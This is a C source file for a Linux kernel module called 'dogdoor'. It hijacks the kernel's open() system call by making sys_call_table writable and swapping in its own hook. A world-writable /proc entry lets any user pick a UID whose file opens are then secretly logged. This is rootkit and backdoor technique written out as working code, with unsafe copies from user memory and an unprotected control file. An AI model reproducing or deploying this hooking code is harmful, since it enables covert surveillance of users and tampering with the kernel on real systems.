#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/buffer_head.h>
#include <asm/unistd.h>
#include <asm/segment.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");

char user_uid[128] = { 0x0, } ;
void ** sctable ;
uid_t username_uid = -1;

asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 

struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file *file) 
{
        filp_close(file, NULL);
}

int file_read(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}  

int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file *file) 
{
    vfs_fsync(file, 0);
    return 0;
}

asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
{
	char fname[256] ;

	copy_from_user(fname, filename, 256) ;

    const struct cred * my_cred = current_cred();
    long i_user_uid = simple_strtol(user_uid, NULL, 10);

    if (my_cred->uid.val == (unsigned int)i_user_uid && i_user_uid != -1) {
        struct file * ftest = file_open("/var/log/test.log", O_WRONLY|O_CREAT, 0644);
        file_write(ftest, 0, "testtest", 8);
        file_close(ftest);
        printk("FILE: %s, Current UID: %d, Current EUID: %d\n", filename, my_cred->uid, my_cred->euid);
    }

	return orig_sys_open(filename, flags, mode) ;
}


static 
int dogdoor_proc_open(struct inode *inode, struct file *file) {
	return 0 ;
}

static 
int dogdoor_proc_release(struct inode *inode, struct file *file) {
	return 0 ;
}

static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[256] ;
	ssize_t toread ;

    sprintf(buf, "%s", user_uid);

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;
	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;	
	*offset = *offset + toread ;
	return toread ;
}

static 
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[128] ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;

	sscanf(buf,"%s", user_uid) ;
	*offset = strlen(buf) ;

	return *offset ;
}

static const struct file_operations dogdoor_fops = {
	.owner = 	THIS_MODULE,
	.open = 	dogdoor_proc_open,
	.read = 	dogdoor_proc_read,
	.write = 	dogdoor_proc_write,
	.llseek = 	seq_lseek,
	.release = 	dogdoor_proc_release,
} ;

static 
int __init dogdoor_init(void) {
	unsigned int level ; 
	pte_t * pte ;

	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;

	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_open = sctable[__NR_open] ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	if (pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW ;		
	sctable[__NR_open] = dogdoor_sys_open ;

	return 0;
}

static 
void __exit dogdoor_exit(void) {
	unsigned int level ;
	pte_t * pte ;
	remove_proc_entry("dogdoor", NULL) ;

	sctable[__NR_open] = orig_sys_open ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	pte->pte = pte->pte &~ _PAGE_RW ;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
